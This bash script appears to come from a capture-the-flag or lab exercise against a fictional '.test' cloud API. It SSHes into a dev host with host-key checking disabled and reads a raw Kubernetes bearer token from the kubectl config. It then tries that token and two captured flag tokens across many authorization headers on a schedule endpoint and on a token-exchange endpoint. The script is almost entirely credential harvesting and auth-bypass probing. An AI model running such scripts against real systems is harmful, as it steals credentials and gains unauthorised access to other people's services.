#!/bin/bash
set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan-dev 'bash -s' <<'RSH'
set +e
CA=$HOME/.local/share/keplerops/ca.crt
C=https://cloud-api.keplerops.test
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
WT='FLAG{6bb66074f2325405}'
HT='FLAG{adfbabdcdaca98ac}'
p(){ echo "=== $1"; shift; curl -sS -m 12 --cacert $CA -w '\n[%{http_code}]\n' "$@" | head -c 1200; echo; }
echo "########## SCHEDULE DIRECT WITH TOKENS"
for tok in "$WT" "$HT" "$JWT"; do
  p "bearer $tok" -H "Authorization: Bearer $tok" "$C/api/schedules/SCHED-2841"
  p "X-Workspace-Token $tok" -H "X-Workspace-Token: $tok" "$C/api/schedules/SCHED-2841"
  p "X-Workload-Token $tok" -H "X-Workload-Token: $tok" "$C/api/schedules/SCHED-2841"
  p "X-Export-Token $tok" -H "X-Export-Token: $tok" "$C/api/schedules/SCHED-2841"
  p "Authorization Export $tok" -H "Authorization: Export $tok" "$C/api/schedules/SCHED-2841"
done
echo "########## EXCHANGE MATRIX"
for tok in "$WT" "$HT"; do
  p "GET bearer WT" -H "Authorization: Bearer $tok" "$C/api/workspaces/current/token-exchange"
  p "POST bearer empty" -X POST -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
  p "POST body workspace_token" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$tok\"}" "$C/api/workspaces/current/token-exchange"
  p "POST body token" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$tok\"}" "$C/api/workspaces/current/token-exchange"
  p "POST hdr X-Workspace-Token" -X POST -H "X-Workspace-Token: $tok" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
  p "GET hdr X-Workspace-Token" -H "X-Workspace-Token: $tok" "$C/api/workspaces/current/token-exchange"
  p "POST form workspace_token" -X POST --data-urlencode "workspace_token=$tok" "$C/api/workspaces/current/token-exchange"
done
RSH
echo DONE_R7
